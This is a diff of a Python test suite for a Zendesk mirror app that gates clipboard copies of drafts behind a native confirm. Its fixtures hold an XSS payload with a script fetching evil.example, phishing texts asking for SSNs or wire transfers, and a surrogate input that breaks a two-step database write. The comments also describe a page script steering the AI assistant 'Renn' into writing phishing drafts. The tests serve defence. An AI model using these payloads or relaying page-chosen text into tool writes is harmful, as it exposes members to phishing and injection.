+    Articles said so; macros said nothing at all."""
+    conn = empty_db.conn
+    hostile = ('<p>Hi</p><script>fetch("https://evil.example")</script>'
+               '<img src=x onerror="alert(1)">')
+    zendesk_store.upsert_macros(conn, [
+        {"id": 301, "name": "Hostile reply", "active": True,
+         "updated_at": "2026-07-01T00:00:00Z",
+         "actions": [{"field": "comment_value_html", "value": hostile}]}])
+    calls = []
+    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+    ctrl.js_refresh()
+    _review_macro(ctrl, 301)
+    ctrl.js_copy_field("macro", "301", "macro_reply")
+    assert calls[-1] == (hostile, None)                # still byte-verbatim
+    assert seen["copies"][-1]["notice"] == zendesk_web._MACRO_MARKUP_NOTICE
+    assert "active markup" in seen["status"][-1]       # unforgeable surface
+    # the macro NAME is plain text and carries no notice
+    ctrl.js_copy_field("macro", "301", "macro_name")
+    assert seen["copies"][-1]["notice"] == ""
+
+
+def test_macro_reply_plain_text_is_not_falsely_flagged(empty_db):
+    """The other half: a reply is frequently PLAIN TEXT, where sanitize_html
+    differs purely by entity-escaping. Escaping hides nothing, so an
+    ampersand must not raise a security warning on every macro."""
+    conn = empty_db.conn
+    plain = "Billing & Claims: we settle in 3-5 days (that's < 1 week)."
+    zendesk_store.upsert_macros(conn, [
+        {"id": 302, "name": "Plain", "active": True,
+         "updated_at": "2026-07-01T00:00:00Z",
+         "actions": [{"field": "comment_value", "value": plain}]}])
+    from src.data.html_sanitize import sanitize_html
+    assert sanitize_html(plain) != plain               # escaping-only delta
+    calls = []
+    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+    ctrl.js_refresh()
+    _review_macro(ctrl, 302)
+    ctrl.js_copy_field("macro", "302", "macro_reply")
+    assert calls[-1] == (plain, None)
+    assert seen["copies"][-1]["notice"] == ""
+    assert "WARNING" not in seen["status"][-1]
+
+
+# ── THE UNIVERSAL DRAFT-COPY CONFIRM ─────────────────────────────────
+#
+# A draft is by definition content that is NOT yet in Zendesk and is about
+# to be pasted into a public site by hand. The review record only proves "a
+# diff payload was PRODUCED for these bytes" — js_request_diff is
+# page-callable, so a renderer-less script mints it for free.
+#
+# Round 4 tried to gate only the bytes the PAGE authored, tracked in a
+# provenance ledger. Two independent attackers broke it:
+#
+#   E1  js_save_draft's macro branch committed `name` and `description` in
+#       TWO transactions and stamped provenance only after both. A lone
+#       unpaired surrogate in `description` (json.loads accepts it, the
+#       sqlite bind refuses it) made the second write raise AFTER the first
+#       had committed, so the page's chosen name was in the DB with no
+#       stamp -> zero confirms, clipboard, ordinary success status line.
+#
+#   E2  page.py co-registers the Renn chat bridge on the SAME QWebChannel
+#       (extra_bridges={"almaBridge": ...}) and ChatBridge.send is a @Slot.
+#       So a page script chooses the exact text Renn receives, Renn calls
+#       propose_article_update, and the page-chosen title/body land in a
+#       draft VERBATIM through a Python-side actor the controller never
+#       observes. No stamp, no confirm, clipboard -- including a full
+#       phishing body asking members to phone in an SSN.
+#
+# The model was wrong, not the implementation: "a Python-side actor wrote
+# it" does NOT imply "the page did not choose it". Any Python actor whose
+# INPUT the page controls is not a trustworthy authorship source, so
+# authorship is unknowable here and the ledger is deleted.
+#
+# What replaces it is simpler AND stronger: EVERY clipboard release of
+# DRAFT content -- article draft or macro draft, every field, both mime
+# flavours -- takes a NATIVE confirm that DISPLAYS THE EXACT BYTES. It does
+# not matter who authored them, because the human sees exactly what is
+# going to the clipboard at the moment it goes. Fail closed: no confirm_fn,
+# declined, or bytes that moved under the dialog => no clipboard write and
+# no copy_resolved receipt.
+#
+# MIRROR rows (already live in Zendesk, unmodified) keep the round-3
+# review-record gate plus the markup notice, unchanged.
+
+PAGE_PHISH_TITLE = ("Action required: re-verify your provider credentials "
+                    "at https://alma-health-verify.example/sso before Friday")
+
+PHISH_BODY_MD = (
+    "# Urgent: benefits verification\n\n"
+    "Call 1-555-0142 and provide your SSN, member ID and card number to "
+    "keep your coverage active.\n")
+
+
+def _served_article_draft(conn, ctrl):
+    """A Renn-shaped article draft, served to the controller."""
+    did = zendesk_store.save_article_draft(
+        conn, title="Setting up SSO", body="renn body", article_id=101,
+        body_html="<p>renn body</p>", rationale="r")
+    _serve_revisions(ctrl)
+    return did
+
+
+def test_draft_copy_without_a_confirm_fn_fails_closed(empty_db):
+    """THE ROUND-4 EXPLOIT CHAIN, executed verbatim, with every emitted
+    signal discarded (a renderer that displays nothing): the page authors
+    the title through the rename allowlist, mints the review record with
+    requestDiff, marks ready, and asks for the clipboard.
+
+    No confirm_fn injected -> refused, and no copy_resolved receipt."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    calls = []
+    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+    did = _served_article_draft(conn, ctrl)
+    ctrl.js_save_draft("article", str(did),
+                       json.dumps({"title": PAGE_PHISH_TITLE}))
+    ctrl.js_request_diff("article", str(did))
+    ctrl.js_mark_ready("article", str(did))
+    ctrl.js_copy_field("article_draft", str(did), "title")
+    assert calls == [] and seen["copies"] == []
+    assert "only be copied from the app window" in seen["status"][-1]
+    # the DB write itself is allowed (renaming a draft is legitimate); it is
+    # the CLIPBOARD that is gated
+    assert zendesk_store.get_article_draft(conn, did)["title"] == PAGE_PHISH_TITLE
+
+
+def test_draft_copy_confirm_shows_the_exact_bytes(empty_db):
+    """Declining writes nothing and issues no receipt; approving copies —
+    and either way the confirm was handed the EXACT bytes."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    calls = []
+    answers = [False, True]
+    ctrl, seen, confirms = _gated(
+        empty_db, answer=lambda: answers.pop(0),
+        clipboard_fn=_clipboard(calls))
+    did = _served_article_draft(conn, ctrl)
+    ctrl.js_save_draft("article", str(did),
+                       json.dumps({"title": PAGE_PHISH_TITLE}))
+    ctrl.js_request_diff("article", str(did))
+    ctrl.js_mark_ready("article", str(did))
+
+    ctrl.js_copy_field("article_draft", str(did), "title")     # declined
+    assert len(confirms) == 1
+    assert PAGE_PHISH_TITLE in _confirm_blob(confirms)         # bytes SHOWN
+    assert calls == [] and seen["copies"] == []                # no receipt
+    assert "Copy cancelled" in seen["status"][-1]
+
+    ctrl.js_copy_field("article_draft", str(did), "title")     # approved
+    assert len(confirms) == 2
+    assert calls == [(PAGE_PHISH_TITLE, None)]
+    assert seen["copies"][-1]["ok"] is True
+
+
+def test_macro_draft_copy_needs_the_confirm_on_every_field(empty_db):
+    """The macro half: name AND reply, both gated, regardless of which
+    actor wrote which (the reply here is Renn's)."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    calls = []
+    ctrl, seen, confirms = _gated(empty_db, answer=False,
+                                  clipboard_fn=_clipboard(calls))
+    did = zendesk_store.save_macro_draft(
+        conn, name="Refund apology", macro_id=201, rationale="r",
+        actions=[{"field": "comment_value", "value": "Hi there"}])
+    _serve_revisions(ctrl)
+    ctrl.js_save_draft("macro", str(did),
+                       json.dumps({"name": PAGE_PHISH_TITLE}))
+    ctrl.js_request_diff("macro", str(did))
+    ctrl.js_mark_ready("macro", str(did))
+    ctrl.js_copy_field("macro_draft", str(did), "macro_name")
+    ctrl.js_copy_field("macro_draft", str(did), "macro_reply")
+    assert calls == [] and seen["copies"] == []
+    assert len(confirms) == 2                       # one per attempted field
+    blob = _confirm_blob(confirms)
+    assert PAGE_PHISH_TITLE in blob and "Hi there" in blob
+
+
+def test_draft_body_copy_shows_both_clipboard_flavours(empty_db):
+    """A full page-authored BODY, in the plain and the text/html mime
+    flavour alike — both strings reach the dialog, because both reach the
+    clipboard."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    evil = (f"# Notice\n\n[{PAGE_PHISH_TITLE}]"
+            "(https://alma-health-verify.example/sso)")
+    calls = []
+    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+    did = _served_article_draft(conn, ctrl)
+    ctrl.js_save_body_edit("draft", str(did), json.dumps({"body": evil}))
+    ctrl.js_request_diff("article", str(did))
+    ctrl.js_mark_ready("article", str(did))
+    for field in ("body_html", "body_rich"):
+        ctrl.js_copy_field("article_draft", str(did), field)
+    assert calls == [] and seen["copies"] == []        # fails closed
+
+    # the same chain on a second draft, behind an approving native confirm
+    calls2 = []
+    ctrl2, seen2, confirms = _gated(empty_db, answer=True,
+                                    clipboard_fn=_clipboard(calls2))
+    did2 = zendesk_store.save_article_draft(
+        conn, title="Setting up SSO", body="renn body", article_id=101,
+        body_html="<p>renn body</p>", rationale="r")
+    _serve_revisions(ctrl2)
+    ctrl2.js_save_body_edit("draft", str(did2), json.dumps({"body": evil}))
+    ctrl2.js_request_diff("article", str(did2))
+    ctrl2.js_mark_ready("article", str(did2))
+    ctrl2.js_copy_field("article_draft", str(did2), "body_html")
+    ctrl2.js_copy_field("article_draft", str(did2), "body_rich")
+    assert len(confirms) == 2                          # one per released field
+    stored = zendesk_store.get_article_draft(conn, did2)["body_html"]
+    blob = _confirm_blob(confirms)
+    assert PAGE_PHISH_TITLE in blob and stored in blob
+    assert calls2[0] == (stored, None)
+    text, html = calls2[1]
+    assert text == stored and html is not None
+    assert html in blob          # BOTH clipboard flavours were displayed
+
+
+def test_article_target_body_edit_draft_is_gated_on_every_field(empty_db):
+    """js_save_body_edit(target_kind='article') CREATES the draft. Its body
+    is page-written and its title came from the mirror row — under the old
+    per-field provenance model only the body was gated. Both are draft
+    content, so both are gated now."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    calls = []
+    ctrl, seen, confirms = _gated(empty_db, answer=False,
+                                  clipboard_fn=_clipboard(calls))
+    ctrl.js_open_article("101")
+    ctrl.js_save_body_edit("article", "101",
+                           json.dumps({"body": PAGE_PHISH_TITLE}))
+    did = seen["actions"][-1]["draft_id"]
+    ctrl.js_request_diff("article", str(did))
+    ctrl.js_mark_ready("article", str(did))
+    ctrl.js_copy_field("article_draft", str(did), "body_html")
+    ctrl.js_copy_field("article_draft", str(did), "title")
+    assert calls == [] and seen["copies"] == []
+    assert len(confirms) == 2
+    blob = _confirm_blob(confirms)
+    assert PAGE_PHISH_TITLE in blob and "Setting up SSO" in blob
+    # the MIRROR article the draft targets is unaffected: no confirm there
+    ctrl.js_copy_field("article", "101", "title")
+    assert calls == [("Setting up SSO", None)]
+    assert len(confirms) == 2
+
+
+def test_mirror_copies_stay_confirm_free(empty_db):
+    """The other half of the rule, and the reason it is not just "confirm
+    everything": content ALREADY LIVE in Zendesk — pulled articles, imported
+    articles, mirror macros — copies under the recorded review alone. The
+    ergonomics of browsing the mirror must not pay for the draft gate."""
+    conn = empty_db.conn
+    _seed_mirror(conn)                                  # 101/201 = pull origin
+    zendesk_store.upsert_articles(conn, [
+        {"id": 701, "title": "Imported", "body_html": "<p>from a file</p>",
+         "updated_at": "2026-07-01T00:00:00Z"}], origin="import",
+        source_file="C:/tmp/x.html")
+    calls = []
+    ctrl, seen, confirms = _gated(empty_db, answer=False,   # any confirm = fail
+                                  clipboard_fn=_clipboard(calls))
+    ctrl.js_refresh()
+    _review_article(ctrl, 101)                          # pull origin
+    _review_article(ctrl, 701)                          # import origin
+    _review_macro(ctrl, 201)
+    ctrl.js_copy_field("article", "101", "body_html")
+    ctrl.js_copy_field("article", "701", "body_html")
+    ctrl.js_copy_field("article", "101", "body_rich")
+    ctrl.js_copy_field("macro", "201", "macro_reply")
+    ctrl.js_copy_field("macro", "201", "macro_name")
+    assert confirms == []                               # no dialog anywhere
+    assert [c[0] for c in calls] == [
+        zendesk_store.get_article(conn, 101)["body_html"],
+        zendesk_store.get_article(conn, 701)["body_html"],
+        zendesk_store.get_article(conn, 101)["body_html"],
+        "Hi there",
+        "Refund apology"]
+
+
+def test_e2_renn_written_draft_still_demands_a_confirm(empty_db):
+    """E2, THE STRUCTURAL BREAK, as a regression.
+
+    The page cannot call save_article_draft — but it CAN call
+    almaBridge.send (the Renn chat bridge rides this very QWebChannel), so
+    it chooses the exact text Renn receives, and Renn's propose tool writes
+    those page-chosen bytes into a draft VERBATIM. Drive the draft in
+    through that Python-side path here (tools._propose_article_update_impl
+    is what the MCP surface calls), then run the rest of the chain: mint the
+    review record with requestDiff, markReady, copyField.
+
+    Under the round-4 provenance ledger this produced ZERO confirms and put
+    a phishing body on the clipboard. Now the copy is refused, because
+    "who authored it" is no longer a question the gate asks."""
+    from src.data.chat_tools import zendesk_mirror_tools as tools
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    calls = []
+    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+
+    # --- the laundering step: page-chosen bytes, written by a Python actor
+    res = tools._propose_article_update_impl(
+        conn, title=PAGE_PHISH_TITLE, body_markdown=PHISH_BODY_MD,
+        rationale="member outreach", article_id=101)
+    did = res["draft_id"]
+    stored = zendesk_store.get_article_draft(conn, did)
+    assert stored["title"] == PAGE_PHISH_TITLE          # verbatim, as E2 found
+    assert "SSN" in stored["body"]
+
+    _serve_revisions(ctrl)
+    ctrl.js_request_diff("article", str(did))
+    ctrl.js_mark_ready("article", str(did))
+    for field in ("title", "body_html", "body_rich"):
+        ctrl.js_copy_field("article_draft", str(did), field)
+    assert calls == [] and seen["copies"] == []
+    assert "only be copied from the app window" in seen["status"][-1]
+
+    # and with a confirm wired, the human is shown the phishing body itself
+    calls2 = []
+    ctrl2, seen2, confirms = _gated(empty_db, answer=False,
+                                    clipboard_fn=_clipboard(calls2))
+    _serve_revisions(ctrl2)
+    ctrl2.js_request_diff("article", str(did))
+    ctrl2.js_copy_field("article_draft", str(did), "body_html")
+    assert calls2 == [] and seen2["copies"] == []
+    blob = _confirm_blob(confirms)
+    assert "SSN" in blob and "1-555-0142" in blob
+
+
+def test_e1_macro_rename_is_one_transaction(empty_db):
+    """E1, as the data-integrity bug it is.
+
+    js_save_draft's macro branch used to commit `name` and then `description`
+    separately. json.loads happily produces a lone unpaired surrogate, which
+    sqlite3 refuses to bind — so the second write raised AFTER the first had
+    committed and the page's chosen NAME was live in the DB from a save that
+    reported nothing. One transaction: applied whole or not at all."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    calls = []
+    ctrl, seen, confirms = _gated(empty_db, answer=True,
+                                  clipboard_fn=_clipboard(calls))
+    did = zendesk_store.save_macro_draft(
+        conn, name="Refund apology", macro_id=201, rationale="r",
+        description="sorry note",
+        actions=[{"field": "comment_value", "value": "Hi there"}])
+    _serve_revisions(ctrl)
+
+    evil_name = ("Refund apology -- WIRE FUNDS TO acct 4471-9920 "
+                 "BEFORE REFUND")
+    # '\ud800' survives json.loads and dies at the sqlite bind
+    payload = json.dumps({"name": evil_name, "description": "\ud800"})
+    assert json.loads(payload)["description"] == "\ud800"
+    ctrl.js_save_draft("macro", str(did), payload)
+
+    row = zendesk_store.get_macro_draft(conn, did)
+    assert row["name"] == "Refund apology"          # rolled back, not partial
+    assert row["description"] == "sorry note"
+    assert conn.in_transaction is False             # no wedged transaction
+
+    # the tab survives and a well-formed rename still works
+    ctrl.js_save_draft("macro", str(did),
+                       json.dumps({"name": "Refund apology v2",
+                                   "description": "kinder note"}))
+    row = zendesk_store.get_macro_draft(conn, did)
+    assert row["name"] == "Refund apology v2"
+    assert row["description"] == "kinder note"
+
+    # ...and the clipboard still demands the confirm for the new bytes
+    ctrl.js_request_diff("macro", str(did))
+    ctrl.js_mark_ready("macro", str(did))
+    ctrl.js_copy_field("macro_draft", str(did), "macro_name")
+    assert calls == [("Refund apology v2", None)]
+    assert len(confirms) == 1
+
+
+def test_the_provenance_ledger_is_gone(empty_db):
+    """The failing mechanism was REMOVED, not patched again. If a future
+    change reintroduces an authorship ledger, this test says so out loud —
+    the whole point of E2 is that authorship cannot be known here."""
+    ctrl, _seen = _controller(empty_db)
+    for attr in ("_page_authored", "_mark_page_authored",
+                 "_page_authored_now"):
+        assert not hasattr(ctrl, attr), f"{attr} is back"
+    src = (REPO / "src" / "services" / "zendesk_web.py").read_text(
+        encoding="utf-8")
+    assert "page_authored" not in src
+
+
+def test_draft_copy_confirm_runs_the_destructive_gate_discipline(empty_db):
+    """Same belts as delete/purge: the single-winner claim is held while the
+    modal's nested event loop spins (so a re-entrant page script finds every
+    mutating slot frozen), a raising dialog means NO, and bytes that move
+    under the modal are refused."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    holder, calls = {}, []
+    seen_state = []
+
+    def reenter():
+        c = holder["c"]
+        seen_state.append(c._action_inflight)
+        c.js_save_draft("article", str(holder["did"]),
+                        json.dumps({"title": "RE-ENTERED"}))
+        c.js_request_pull()
+        return True
+
+    ctrl, seen, confirms = _gated(empty_db, answer=reenter,
+                                  clipboard_fn=_clipboard(calls))
+    holder["c"] = ctrl
+    did = _served_article_draft(conn, ctrl)
+    holder["did"] = did
+    ctrl.js_save_draft("article", str(did), json.dumps({"title": "PAGE"}))
+    ctrl.js_request_diff("article", str(did))
+    ctrl.js_mark_ready("article", str(did))
+    ctrl.js_copy_field("article_draft", str(did), "title")
+    assert seen_state == [True]                    # claim held under the modal
+    assert calls == [("PAGE", None)]               # the re-entrant rename lost
+    assert zendesk_store.get_article_draft(conn, did)["title"] == "PAGE"
+    assert seen["pulls"] == []
+    assert ctrl._action_inflight is False          # released
+
+    # a dialog that raises means NO
+    def boom():
+        raise RuntimeError("broken dialog")
+    ctrl2, seen2, _c2 = _gated(empty_db, answer=boom,
+                               clipboard_fn=_clipboard(calls))
+    _serve_revisions(ctrl2)
+    ctrl2.js_save_draft("article", str(did), json.dumps({"title": "PAGE2"}))
+    ctrl2.js_request_diff("article", str(did))
+    n = len(calls)
+    ctrl2.js_copy_field("article_draft", str(did), "title")
+    assert len(calls) == n
+
+    # bytes that move WHILE the modal is open are refused after the approve
+    def approve_after_rewrite():
+        zendesk_store.update_article_draft(conn, did, title="SWAPPED")
+        return True
+    ctrl3, seen3, _c3 = _gated(empty_db, answer=approve_after_rewrite,
+                               clipboard_fn=_clipboard(calls))
+    _serve_revisions(ctrl3)
+    ctrl3.js_save_draft("article", str(did), json.dumps({"title": "PAGE3"}))
+    ctrl3.js_request_diff("article", str(did))
+    ctrl3.js_copy_field("article_draft", str(did), "title")
+    assert len(calls) == n
+    assert "changed while the confirm was open" in seen3["status"][-1]
+
+
+def test_confirm_bytes_survive_a_legacy_two_arg_confirm(empty_db):
+    """A host whose confirm takes only (title, text) must still SHOW the
+    bytes — they move into the message rather than being dropped. The arity
+    is decided by introspection, so the dialog is never opened twice."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    calls, confirms = [], []
+
+    def two_arg_confirm(title, text):
         confirms.append((title, text))
-        if callable(answer):
-            return answer()
-        return answer
-    ctrl, seen = _controller(db, confirm_fn=confirm, **kw)
-    return ctrl, seen, confirms
+        return True
 
+    ctrl, seen = _controller(empty_db, confirm_fn=two_arg_confirm,
+                             clipboard_fn=_clipboard(calls))
+    did = _served_article_draft(conn, ctrl)
+    long_body = "Paste this everywhere. " + ("x" * 900)
+    ctrl.js_save_body_edit("draft", str(did),
+                           json.dumps({"body": long_body}))
+    ctrl.js_request_diff("article", str(did))
+    ctrl.js_mark_ready("article", str(did))
+    ctrl.js_copy_field("article_draft", str(did), "body_html")
+    assert len(confirms) == 1                       # opened exactly once
+    stored = zendesk_store.get_article_draft(conn, did)["body_html"]
+    assert stored in confirms[0][1]                 # bytes still displayed
+    assert calls == [(stored, None)]
+
+
+def test_short_bytes_go_inline_long_bytes_go_to_the_detail_pane(empty_db):
+    """Presentation contract of the confirm: short payloads are in the
+    message itself, long ones ride the scrollable detail pane — never
+    truncated, never absent."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    calls = []
+    ctrl, seen, confirms = _gated(empty_db, answer=True,
+                                  clipboard_fn=_clipboard(calls))
+    did = _served_article_draft(conn, ctrl)
+    ctrl.js_save_draft("article", str(did), json.dumps({"title": "Short one"}))
+    ctrl.js_request_diff("article", str(did))
+    ctrl.js_mark_ready("article", str(did))
+    ctrl.js_copy_field("article_draft", str(did), "title")
+    title, text, detail = confirms[-1]
+    assert detail is None and "Short one" in text
+
+    zendesk_store.set_draft_status(conn, "article", did, "pending")
+    long_body = "L" * 5000
+    ctrl.js_save_body_edit("draft", str(did), json.dumps({"body": long_body}))
+    ctrl.js_request_diff("article", str(did))
+    ctrl.js_mark_ready("article", str(did))
+    ctrl.js_copy_field("article_draft", str(did), "body_html")
+    title, text, detail = confirms[-1]
+    stored = zendesk_store.get_article_draft(conn, did)["body_html"]
+    assert detail is not None and stored in detail
+    assert long_body[:200] not in text          # the bytes are NOT in the head
+
+
+# ── (c) RENDER FIDELITY: the preview profile vs the clipboard ────────
+#
+# Owner correction: "rendering the article as is (even with custom classes)
+# is an ideal product experience ... given it outlines how the content would
+# render in zendesk and for an end-user". The preview therefore keeps
+# presentational markup (classes/ids/data-attrs/style/tables/iframes — all
+# inert inside sandbox="") while the CLIPBOARD keeps the strict profile, and
+# the markup notice fires only when something genuinely cannot be displayed.
+
+PULLED_ZENDESK_HTML = (
+    '<div class="article-body" data-theme="copenhagen" id="art-101">'
+    '<h2 class="hc-heading">Steps</h2>'
+    '<p style="text-align:center;margin-bottom:12px">Log in.</p>'
+    '<table class="hc-table" border="1" cellpadding="6">'
+    '<colgroup><col width="120"></colgroup>'
+    '<tr><td colspan="2" style="background-color:#f8f9f9">Plan</td></tr>'
+    '</table>'
+    '<section><details><summary>More</summary><p>Detail.</p></details>'
+    '</section>'
+    '<iframe src="https://player.vimeo.com/video/1" width="560" '
+    'height="315"></iframe></div>')
+
+
+def test_pulled_article_preview_keeps_presentational_markup(empty_db):
+    """A realistic pulled article renders faithfully AND raises no notice —
+    the whole point of the owner correction. Under the strict profile every
+    one of these attributes vanished and the red banner fired on every
+    article, which trains people to ignore it."""
+    conn = empty_db.conn
+    zendesk_store.upsert_articles(conn, [
+        {"id": 801, "title": "Pulled", "body_html": PULLED_ZENDESK_HTML,
+         "updated_at": "2026-07-01T00:00:00Z"}], origin="pull")
+    ctrl, seen = _controller(empty_db)
+    ctrl.js_refresh()
+    _review_article(ctrl, 801)
+    detail = seen["article"][-1]
+    doc = detail["body_srcdoc"]
+    for kept in ('class="article-body"', 'data-theme="copenhagen"',
+                 'id="art-101"', "text-align: center", 'border="1"',
+                 'colspan="2"', "<colgroup", "<section", "<details",
+                 "player.vimeo.com"):
+        assert kept in doc, kept
+    # Help Center article CSS ships in the srcdoc
+    assert "<style>" in doc and ".alma-hc-article" in doc
+    # nothing was lost, so no warning
+    assert detail["markup_notice"] == ""
+    # the STRICT profile would have thrown most of it away — the two
+    # profiles are genuinely different, and only the preview widened
+    assert 'data-theme="copenhagen"' not in sanitize_html(PULLED_ZENDESK_HTML)
+    assert "<iframe" not in sanitize_html(PULLED_ZENDESK_HTML)
+
+
+def test_preview_still_strips_scripts_handlers_and_active_urls(empty_db):
+    """Widening the preview did not widen what executes: scripts, event
+    handlers and javascript: URLs are still gone, and now they are the ONLY
+    things that raise the notice."""
+    conn = empty_db.conn
+    zendesk_store.upsert_articles(conn, [
+        {"id": 802, "title": "Hostile", "body_html": HOSTILE_HTML,
+         "updated_at": "2026-07-01T00:00:00Z"}], origin="pull")
+    ctrl, seen = _controller(empty_db)
+    ctrl.js_refresh()
+    _review_article(ctrl, 802)
+    detail = seen["article"][-1]
+    doc = detail["body_srcdoc"].lower()
+    assert "<script" not in doc and "onerror" not in doc
+    assert "javascript:" not in doc
+    assert "purgemirror" not in doc            # the script BODY is gone too
+    assert "preview does not display" in detail["markup_notice"]
+    # the exact stored bytes are still shown verbatim for the source panel
+    assert detail["body_source"] == HOSTILE_HTML
+
+
+def test_clipboard_never_uses_the_preview_profile(empty_db):
+    """The load-bearing separation: the rich (text/html) clipboard flavour
+    is strict-sanitized even though the preview would have kept far more.
+    A wider preview must never become a wider paste."""
+    conn = empty_db.conn
+    zendesk_store.upsert_articles(conn, [
+        {"id": 803, "title": "Pulled", "body_html": PULLED_ZENDESK_HTML,
+         "updated_at": "2026-07-01T00:00:00Z"}], origin="pull")
+    calls = []
+    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+    ctrl.js_refresh()
+    _review_article(ctrl, 803)
+    ctrl.js_copy_field("article", "803", "body_rich")
+    text, html = calls[-1]
+    assert text == PULLED_ZENDESK_HTML                  # plain stays verbatim
+    assert html == sanitize_html(PULLED_ZENDESK_HTML)   # STRICT, not preview
+    assert "<iframe" not in html and "data-theme" not in html
+    assert seen["copies"][-1]["sanitized"] is True
+
+
+def test_preview_profile_is_additive_strict_is_untouched():
+    """The strict allowlist is not derived from the preview one and did not
+    move: this is what keeps a preview widening out of the stored-content
+    and clipboard paths."""
+    from src.data import html_sanitize as hs
+    assert hs.PREVIEW_ALLOWED_TAGS > hs.ALLOWED_TAGS     # strict superset
+    assert "iframe" in hs.PREVIEW_ALLOWED_TAGS
+    assert "iframe" in hs.DROP_WITH_CONTENT              # strict: dropped
+    assert "script" in hs.PREVIEW_DROP_WITH_CONTENT
+    # the strict profile still refuses everything it always refused
+    assert sanitize_html('<p class="x" id="y" data-z="1">hi</p>') == \
+        '<p class="x">hi</p>'
+
+
+# ── destructive gates: delete_revision ───────────────────────────────
 
 def test_delete_revision_approve_once_dispatches(empty_db):
     _seed_mirror(empty_db.conn)
@@ -836,6 +2675,7 @@ def test_delete_revision_single_winner_reentrancy(empty_db):
         c.js_purge_mirror("all")
         c.js_mark_ready("article", str(d2))
         c.js_save_draft("article", str(d2), json.dumps({"title": "X"}))
+        c.js_save_body_edit("draft", str(d2), json.dumps({"body": "EVIL"}))
         c.js_request_pull()
         c.js_request_import()
         return True
@@ -848,6 +2688,7 @@ def test_delete_revision_single_winner_reentrancy(empty_db):
     assert seen["actions"][0]["draft_id"] == d1
     assert zendesk_store.get_article_draft(conn, d2) is not None
     assert zendesk_store.get_article_draft(conn, d2)["title"] == "C"
+    assert zendesk_store.get_article_draft(conn, d2)["body"] == "D"
     assert seen["pulls"] == [] and seen["imports"] == []
 
 
@@ -870,7 +2711,7 @@ def test_purge_scope_all_text_and_recomputed_counts(empty_db):
         return True
     ctrl, seen, confirms = _gated(empty_db, answer=approve_and_grow)
     ctrl.js_purge_mirror("all")
-    title, text = confirms[0]
+    title, text, _detail = confirms[0]
     assert "2 articles" in text and "2 macros" in text
     assert "1 pending/ready revisions" in text
     assert "Copied/pushed revisions are kept" in text
@@ -1154,6 +2995,7 @@ def test_bridge_relays_signals_and_slots(empty_db):
         open_article_fn=ctrl.js_open_article, open_macro_fn=ctrl.js_open_macro,
         search_fn=ctrl.js_search, revisions_fn=ctrl.js_request_revisions,
         diff_fn=ctrl.js_request_diff, save_fn=ctrl.js_save_draft,
+        save_body_edit_fn=lambda *a: calls.append(("bodyedit",) + a),
         ready_fn=ctrl.js_mark_ready, copied_fn=ctrl.js_mark_copied,
         copy_fn=ctrl.js_copy_field, import_fn=ctrl.js_request_import,
         import_folder_fn=ctrl.js_request_import_folder,
@@ -1172,6 +3014,9 @@ def test_bridge_relays_signals_and_slots(empty_db):
     assert got["revisions"][-1]["filter"] == "all"
     bridge.requestPull()
     assert calls == ["pull"]
+    # saveBodyEdit relays the three string args verbatim
+    bridge.saveBodyEdit("draft", "7", '{"body":"x"}')
+    assert calls[-1] == ("bodyedit", "draft", "7", '{"body":"x"}')
     ctrl.set_status("hi")
     assert got["status"] == ["hi"]
     assert bridge.ping() == "pong"
@@ -1182,6 +3027,7 @@ def test_bridge_inert_uninjected_and_swallows_raises():
     inert.refresh(); inert.setView("articles"); inert.openArticle("1")
     inert.openMacro("1"); inert.search("q", "all"); inert.requestRevisions("open")
     inert.requestDiff("article", "1"); inert.saveDraft("article", "1", "{}")
+    inert.saveBodyEdit("draft", "1", "{}")
     inert.markReady("article", "1"); inert.markCopied("article", "1")
     inert.copyField("article", "1", "title"); inert.requestImport()
     inert.requestImportFolder(); inert.requestPull()
@@ -1190,9 +3036,10 @@ def test_bridge_inert_uninjected_and_swallows_raises():
     def boom(*a):
         raise RuntimeError("hostile callable")
     angry = ZendeskBridge(refresh_fn=boom, save_fn=boom, purge_fn=boom,
-                          copy_fn=boom, pull_fn=boom)
+                          copy_fn=boom, pull_fn=boom, save_body_edit_fn=boom)
     angry.refresh(); angry.saveDraft("a", "1", "{}"); angry.purgeMirror("all")
     angry.copyField("article", "1", "title"); angry.requestPull()
+    angry.saveBodyEdit("draft", "1", "{}")
     assert angry.ping() == "pong"
 
 
